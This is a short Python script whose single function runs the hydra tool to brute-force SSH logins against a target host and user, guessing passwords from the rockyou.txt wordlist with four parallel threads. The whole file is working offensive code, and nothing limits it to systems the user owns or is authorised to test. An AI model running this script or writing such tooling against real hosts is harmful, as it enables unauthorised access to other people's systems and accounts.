import subprocess


def bruteforce_ssh(target: str, user: str, port: str = "22"):
    wordlist = "../wordlist/rockyou.txt"

    cmd = [
        "hydra",
        "-l", user,
        "-P", wordlist,
        "-t", "4",
        "-s", port,
        target, "ssh"
    ]
    print(f"[*] {' '.join(cmd)}\n")
    subprocess.run(cmd)
